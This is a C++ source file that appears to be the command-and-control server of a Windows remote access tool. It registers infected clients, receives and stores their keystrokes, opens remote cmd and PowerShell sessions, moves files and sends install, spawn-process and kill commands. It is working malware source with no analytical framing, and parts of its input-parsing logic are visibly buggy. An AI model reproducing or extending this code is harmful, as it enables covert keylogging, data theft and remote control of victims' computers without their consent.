#include "pch.h"
#include "ServerTCP.h"
#include "WinUSSREngine/Base/Config.h"
#include "WinUSSREngine/Base/Utility.h"
#include <iostream>

namespace WinUSSREngine::TCP
{
	Server* Server::s_Instance = nullptr;

	Server& Server::GetServer() { return *s_Instance; }

	void Server::ListenerThread()
	{
		while (!config->Flags.DestroyAllThreads)
		{
			if (!GetServer().acceptConnection())
			{
				//DET_PRINTMSG_SERVER("Failed to accept the client's connection.");
				std::string errCode = "Error code " + s_Instance->m_Wrapper.GetError();
				//DET_PRINTMSG_SERVER(errCode);
			}
			else
			{
				std::lock_guard<std::mutex> lock(s_Instance->m_connectionMgr_mutex); //Lock connection manager mutex since we are adding an element to connection vector
				int NewConnectionID = s_Instance->m_connections.size(); //default new connection id to size of connections vector (we will change it if we can reuse an unused connection)
				if (s_Instance->m_unusedConnections > 0) //If there is an unused connection that this client can use
				{
					for (size_t i = 0; i < s_Instance->m_connections.size(); i++) //iterate through the unused connections starting at first connection
					{
						if (s_Instance->m_connections[i]->isActive() == false) //If connection is not active
						{
							s_Instance->m_connections[i]->socket() = s_Instance->m_ClientSocket;
							s_Instance->m_connections[i]->setActive();
							NewConnectionID = i;
							--s_Instance->m_unusedConnections;
							s_Instance->m_connections[i]->setId(NewConnectionID);
							break;
						}
					}
				}
				else //If no unused connections available... (add new connection to the socket)
				{
					std::shared_ptr<Connections> newConnection(new Connections(s_Instance->m_ClientSocket));
					s_Instance->m_connections.push_back(newConnection); //push new connection into vector of connections
				}
				//DET_PRINTMSG_SERVER("Server: Client Connected! ID:" << NewConnectionID << " | IP: " << inet_ntoa(s_Instance->m_Addr.sin_addr));
				_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ClientHandlerThread, (LPVOID)(NewConnectionID), NULL, NULL); //Create Thread to handle this client. The index in the socket array for this thread is the value (i).
			}
		}
	}

	void Server::PacketSenderThread()
	{
		while (!config->Flags.DestroyAllThreads)
		{
			for (size_t i = 0; i < s_Instance->m_connections.size(); i++) //for each connection...
			{
				if (s_Instance->m_connections[i]->pm.HasPendingPackets()) //If there are pending packets for this connection's packet manager
				{
					Packet p = s_Instance->m_connections[i]->pm.Retrieve(); //Retrieve packet from packet manager
					if (!s_Instance->sendAllData(i, p.m_Buffer, p.m_Size)) //send packet to connection
					{
						//DET_PRINTMSG_SERVER("Failed to send packet to ID: " << i); //Print out if failed to send packet
						//DET_PRINTMSG_SERVER("Error: " << s_Instance->m_Wrapper.GetError());
					}
					delete p.m_Buffer; //Clean up buffer from the packet p
				}
			}
			std::this_thread::sleep_for(std::chrono::milliseconds(10));
		}
	}

	void Server::ClientHandlerThread(int Id)
	{
		PacketType packettype;
		while (!GetServer().peerDisconnected()) // Holy shit I actually have a use for this now :D
		{
			if (!s_Instance->getPacketType(Id, packettype)) //Get packet type
				break; //If there is an issue getting the packet type, exit this loop
			if (!s_Instance->processPacket(Id, packettype)) //Process packet (packet type)
				break; //If there is an issue processing the packet, exit this loop
		}
		//DET_PRINTMSG_SERVER("Lost connection to client ID : " << Id);
		GetServer().disconnectClient(Id); //Disconnect this client and clean up the connection if possible
	}

	void Server::initNetwork() noexcept
	{
		if (!m_isInitialized)
		{

			bool cmdsLoaded = false;
			if (!cmdsLoaded)
			{
				if (Utility::FileExists(config->AppConfig.Strings[7]))
				{
					m_CmdHandler.readCommandsFromFile(config->AppConfig.Strings[7]);
					cmdsLoaded |= !cmdsLoaded;
				}
				else
				{
					m_CmdHandler.addCmdsByList(config->cmdStrings.CommandList);
					m_CmdHandler.writeCommandsToFile(config->AppConfig.Strings[7]);
					cmdsLoaded |= !cmdsLoaded;
				}
			}
			//DET_PRINTMSG_SERVER("Initializing network...");
			WSAData wData;
			if (WSAStartup(MAKEWORD(2, 2), &wData))
				return;

			m_Socket = socket(AF_INET, SOCK_STREAM, NULL);
			if (m_Socket == INVALID_SOCKET)return;

			m_Settings.IsPublicBroadcast == true ? m_Addr.sin_addr.s_addr = htonl(INADDR_ANY) :
				m_Addr.sin_addr.s_addr = inet_addr("127.0.0.1");
			m_Addr.sin_family = AF_INET;
			m_Addr.sin_port = htons(m_Settings.ServerPort);

			if (bind(m_Socket, (sockaddr*)(&m_Addr), sizeof(m_Addr)) != 0)
				return;

			if (listen(m_Socket, SOMAXCONN) == SOCKET_ERROR)return;

			//DET_PRINTMSG_SERVER("Network initialized successfully!");
			if (!m_Keylogs.isInitialized())
				m_Keylogs.initLogging();
			_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)PacketSenderThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
			m_isInitialized = true;
		}

	}
	bool Server::isInitialized() const noexcept { return m_isInitialized; }

	void Server::destroy() noexcept
	{
		if (s_Instance != nullptr)
		{
			m_isInitialized = false;
			closeNetwork();
		}
		s_Instance = nullptr;
	}

	bool Server::waitForPeer()
	{
		if (listen(m_Socket, 1) != 0) return false;
		return true;
	}

	bool Server::acceptConnection()
	{
		m_ClientSocket = accept(m_Socket, nullptr, nullptr);
		if (m_ClientSocket != INVALID_SOCKET) return true;
		return false;
	}

	bool Server::peerDisconnected() noexcept { return m_Wrapper.GetError() == 10054; }

	void Server::closeNetwork()
	{
		config->Flags.DestroyAllThreads = !config->Flags.DestroyAllThreads;
		closesocket(m_Socket);
		closesocket(m_ClientSocket);
		m_Wrapper.CleanUp();
	}

	void Server::setiNetData(const NetiData& data) noexcept
	{
		m_Settings.ServerIp = data.ServerIp;
		m_Settings.ServerPort = data.ServerPort;
		m_Settings.IsPublicBroadcast = data.IsPublicBroadcast;
	}

	Server::Server() { s_Instance = this; }

	bool Server::processPacket(int Id, PacketType packet)
	{
		switch (packet)
		{
		case PacketType::AppCommand: //Packet Type: chat message
		{
			std::string msg;
			if (!recieveStringMsg(Id, msg))
				return false;
			//DET_PRINTMSG_SERVER("ID [" + std::to_string(Id) + "]: " + msg);
			break;
		}
		case PacketType::ChatMessage:
		{
			std::string msg;
			if (!recieveStringMsg(Id, msg))
				return false;
			//DET_PRINTMSG_SERVER("ID [" + std::to_string(Id) + "]: " + msg);
			break;
		}
		case PacketType::CMDCommand:
		{
			std::string message;
			if (!recieveStringMsg(Id, message))
				return false;
			//DET_PRINTMSG_SERVER(message);
			break;
		}

		case PacketType::Warning:
		{
			std::string message;
			if (!recieveStringMsg(Id, message))
				return false;
			//DET_PRINTMSG_SERVER("ID [" + std::to_string(Id) + "]: " + message);
			break;
		}
		case PacketType::FileTransferRequestFile:
		{
			std::string FileName; //string to store file name
			if (!recieveStringMsg(Id, FileName)) //If issue getting file name
				return false; //Failure to process packet

			m_connections[Id]->file.infileStream.open(FileName, std::ios::binary | std::ios::ate); //Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
			if (!m_connections[Id]->file.infileStream.is_open()) //If file is not open? (Error opening file?)
			{
				return true;
			}

			m_connections[Id]->file.fileName = FileName; //set file name just so we can print it out after done transferring
			m_connections[Id]->file.fileSize = m_connections[Id]->file.infileStream.tellg(); //Get file size
			m_connections[Id]->file.infileStream.seekg(0); //Set cursor position in file back to offset 0 for when we read file
			m_connections[Id]->file.fileOffset = 0; //Update file offset for knowing when we hit end of file

			if (!handleSendFile(Id)) //Attempt to send byte buffer from file. If failure...
				return false;
			break;
		}
		case PacketType::FileTransferRequestNextBuffer:
		{
			if (!handleSendFile(Id)) //Attempt to send byte buffer from file. If failure...
				return false;
			break;
		}
		case PacketType::Keylogger:
		{
			std::string msg;
			if (!recieveStringMsg(Id, msg))
				return false;

			if (config->Flags.IsKeyLogging)
			{
				//DET_PRINTMSG_SERVER("Key Pressed: " + msg);
				m_Keylogs.writeToLog(msg);
			}

			break;
		}
		default: //If packet type is not accounted for
		{
			//DET_PRINTMSG_SERVER("Unrecognized packet : " << (int32_t)packet); //Display that packet was not found
			break;
		}
		}
		return true;
	}

	bool Server::handleSendFile(int ID)
	{
		if (m_connections[ID]->file.fileOffset >= m_connections[ID]->file.fileSize) //If end of file reached then return true and skip sending any bytes
			return true;
		if (!sendPacketType(ID, PacketType::FileTransferByteBuffer)) //Send packet type for file transfer byte buffer
			return false;

		m_connections[ID]->file.remainingBytes = m_connections[ID]->file.fileSize - m_connections[ID]->file.fileOffset; //calculate remaining bytes
		if (m_connections[ID]->file.remainingBytes > m_connections[ID]->file.buffersize) //if remaining bytes > max byte buffer
		{
			m_connections[ID]->file.infileStream.read(m_connections[ID]->file.buffer, m_connections[ID]->file.buffersize); //read in max buffer size bytes
			if (!sendint32_t(ID, m_connections[ID]->file.buffersize)) //send int of buffer size
				return false;
			if (!sendAllData(ID, m_connections[ID]->file.buffer, m_connections[ID]->file.buffersize)) //send bytes for buffer
				return false;
			m_connections[ID]->file.fileOffset += m_connections[ID]->file.buffersize; //increment fileoffset by # of bytes written
		}
		else
		{
			m_connections[ID]->file.infileStream.read(m_connections[ID]->file.buffer, m_connections[ID]->file.remainingBytes); //read in remaining bytes
			if (!sendint32_t(ID, m_connections[ID]->file.remainingBytes)) //send int of buffer size
				return false;
			if (!sendAllData(ID, m_connections[ID]->file.buffer, m_connections[ID]->file.remainingBytes)) //send bytes for buffer
				return false;
			m_connections[ID]->file.fileOffset += m_connections[ID]->file.remainingBytes; //increment fileoffset by # of bytes written
		}

		if (m_connections[ID]->file.fileOffset == m_connections[ID]->file.fileSize) //If we are at end of file
		{
			if (!sendPacketType(ID, PacketType::FileTransfer_EndOfFile)) //Send end of file packet
				return false;
			//Print out data on server details about file that was sent
		}
		return true;
	}

	void Server::updateClientState()
	{
		if (m_currentSessionID == -1)
		{
			config->Flags.IsKeyLogging = false;
			config->Flags.IsRemoteCalc = false;
			config->Flags.IsRemoteCmd = false;
			config->Flags.IsRemotePowerShell32 = false;
			config->Flags.IsRemotePowerShell64 = false;

			m_InputState != UserInputState::AppCmdMode ?
				m_InputState = UserInputState::AppCmdMode : m_InputState;
		}

		if (!config->Flags.IsKeyLogging && m_Keylogs.isOpen())
			m_Keylogs.close();
	}

	void Server::handleUserInput(std::string& input)
	{
		m_Stream << input;
		switch (m_InputState)
		{
		case UserInputState::AppCmdMode:
		{
			while (m_Stream.good())
			{
				std::string tmp;
				std::getline(m_Stream, tmp, (char)0x20);
				m_inputBuffer.push_back(tmp);
				std::this_thread::sleep_for(std::chrono::milliseconds(5));
			}
			m_primary = m_inputBuffer[0];
			m_secondary = m_inputBuffer[1];
			if (m_CmdHandler.prefix() == m_primary)
				parseCommand();

			if (!m_primary.empty())
				m_primary.clear();

			m_Stream.clear();
			m_inputBuffer.clear();
			m_valueFromInput = 0;
			break;
		}
		case UserInputState::RemoteCtrlMode:
		{
			handleRemoteCtrlInput();
			break;
		}
		}
	}

	bool Server::isInputAnInt() // Positive numbers only
	{
		if (!m_secondary.empty() || m_secondary[0] != (char)0xD0A)
		{
			for (char i = 0; i < m_secondary.size(); ++i)
			{
				if (m_secondary[i] < 0x39 || m_secondary[i] > 0x2F) // if input[i] > 57 or input[i] < 47
				{
					m_valueFromInput = (m_secondary[i] - 0x30);
					return true;
				}
			}
		}
		return false;
	}

	void Server::handleRemoteCtrlInput()
	{
		switch (m_InputState)
		{
		case UserInputState::RemoteCtrlMode:
		{
			if (m_primary == "exit")
			{
				sendStringMsg(m_currentSessionID, m_primary, PacketType::CMDCommand);
				m_InputState = UserInputState::AppCmdMode;
				m_primary.clear();
			}

			if (m_primary != "exit" && !m_primary.empty())
			{
				sendStringMsg(m_currentSessionID, m_primary, PacketType::CMDCommand);
				m_primary.clear();
			}
			break;
		}
		}
	}

	void Server::parseCommand() noexcept
	{
		if (m_primary.empty() || m_primary == "\n")
			return;

		if (m_CmdHandler.determineCommand(m_primary) == AppCmds::Help) {  }


		if (m_CmdHandler.determineCommand(m_primary) == AppCmds::CloseAppCommand)
		{
			destroy();
			//DeathEngine2::Application::GetApp().Close();
			return;
		}

		if (m_CmdHandler.determineCommand(m_primary) == AppCmds::ListClients)
		{
			if (m_connections.size() <= 0)
				Utility::OutputMsg("No Clients connected", 2); return;
			Utility::OutputMsg("Listing all Clients, Connected: " + std::to_string(m_connections.size()), 1);
		}

		if (m_currentSessionID == -1)
		{
			switch (m_CmdHandler.determineCommand(m_primary))
			{
			case AppCmds::ConnectToClient:
			{
				if (isInputAnInt())
				{
					int tempInt = m_connections.size() - 1;
					if (m_valueFromInput > tempInt)
						Utility::OutputMsg("Session doesn't exist.", 2);
					m_currentSessionID = m_valueFromInput;
					//DET_PRINTMSG_SERVER("Connected to Session " + std::to_string(m_currentSessionID));
				}
				break;
			}
			default:
			{
				//DET_PRINTMSG_SERVER(config->Responses.ClResponseStrings[8]);
				//DET_PRINTMSG_SERVER(config->Responses.ClResponseStrings[9]);
				break;
			}
			}
		}

		if (m_currentSessionID != -1)
		{
			switch (m_CmdHandler.determineCommand(m_primary))
			{
			case  AppCmds::DisableAll:
			{
				config->Flags.IsKeyLogging = false;
				//DET_PRINTMSG_SERVER(config->Responses.ClResponseStrings[5]);
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);
				break;
			}
			case AppCmds::ToggleKeylogger:
			{

				config->Flags.IsKeyLogging = !config->Flags.IsKeyLogging;

				if (config->Flags.IsKeyLogging)
					m_Keylogs.open(m_secondary.empty() ? config->AppConfig.Strings[5] : m_secondary);
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);

				break;
			}
			case AppCmds::RemoteCmdPrompt:
			{
				m_InputState = UserInputState::RemoteCtrlMode;
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);
				break;
			}
			case AppCmds::RemotePws32:
			{
				m_InputState = UserInputState::RemoteCtrlMode;
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);
				break;
			}
			case AppCmds::RemotePws64:
			{
				m_InputState = UserInputState::RemoteCtrlMode;
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);
				break;
			}
			case AppCmds::SpawnRemoteProc:
			{
				//DET_PRINTMSG_SERVER(config->Responses.ClResponseStrings[3]);
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);
				break;
			}
			case AppCmds::KillClient:
			{
				//DET_PRINTMSG_SERVER(config->Responses.ClResponseStrings[6]);
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);
				break;
			}
			case AppCmds::RestartClientCmd:
			{
				//DET_PRINTMSG_SERVER(config->Responses.ClResponseStrings[7]);
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);
				break;
			}
			case AppCmds::SwitchSessionCmd:
			{
				if (isInputAnInt())
				{
					if (m_currentSessionID != -1)
					{
						int tempInt = m_connections.size() - 1;
						if (m_valueFromInput > tempInt)
						{
							Utility::OutputMsg("Session doesn't exist.", 2);
							break;
						}
						m_currentSessionID = m_valueFromInput;
						Utility::OutputMsg("Switched to Session " + std::to_string(m_currentSessionID), 1);
					}
				}
				break;
			}
			case ExitSessionCmd:
			{
				Utility::OutputMsg("Exited session " + std::to_string(m_currentSessionID), 1);
				m_currentSessionID = -1;
				break;
			}
			case DownloadFileCmd:
			{
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);
				break;
			}
			case UploadFileCmd:
			{
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);
				break;
			}
			case AppCmds::BroadCastToAll:
			{
				// TODO: Have it broadcast commands to all clients
				break;
			}
			case InstallClient:
			{
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);
				break;
			}
			case ToggleKeyboard:
			{
				sendStringMsg(m_currentSessionID, m_primary, PacketType::AppCommand);
				break;
			}
			case InvalidClientCmd:
			{
				if (m_primary.c_str() != "\n") Utility::OutputMsg(std::string("Invalid command: " + m_primary), 2);
				break;
			}
			}
		}
	}

	bool Server::processParameter(std::string& command, std::string compCommand)
	{
		std::string::size_type i = command.find(compCommand);
		if (i != std::string::npos)
		{
			command.erase(i, compCommand.length() + 1);
			return true;
		}
		else return false;
	}

	void Server::listenForNewClient()
	{
		_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ListenerThread, NULL, NULL, NULL); //Create thread that will manage all outgoing packets
	}

	void Server::create(const NetiData& data)
	{
		setiNetData(data);
		initNetwork();

		if (!m_isInitialized)
		{
			m_Wrapper.CleanUp();
			config->Flags.DestroyAllThreads = true;
		}
	}

	void Server::disconnectClient(int ID)
	{
		m_currentSessionID = -1;
		std::lock_guard<std::mutex> lock(m_connectionMgr_mutex); //Lock connection manager mutex since we are possible removing element(s) from the vector
		if (m_connections[ID]->isActive() == false) //If connection has already been disconnected?
		{
			return; //return - this should never happen, but just in case...
		}
		m_connections[ID]->pm.Clear(); //Clear out all remaining packets in queue for this connection
		m_connections[ID]->setActive(); //Update connection's activity status to false since connection is now unused
		closesocket(m_connections[ID]->socket());
		if (ID == (m_connections.size() - 1))
		{
			m_connections.pop_back();
			for (size_t i = m_connections.size() - 1; i >= 0 && m_connections.size() > 0; i--)
			{
				if (m_connections[i]->isActive()) //If connection is active we cannot remove any more connections from vector
					break;
				//If we have not broke out of the for loop, we can remove the current indexed connection
				m_connections.pop_back(); //Erase last connection from vector
				--m_unusedConnections;
			}
		}
		else
		{
			++m_unusedConnections;
		}
	}
}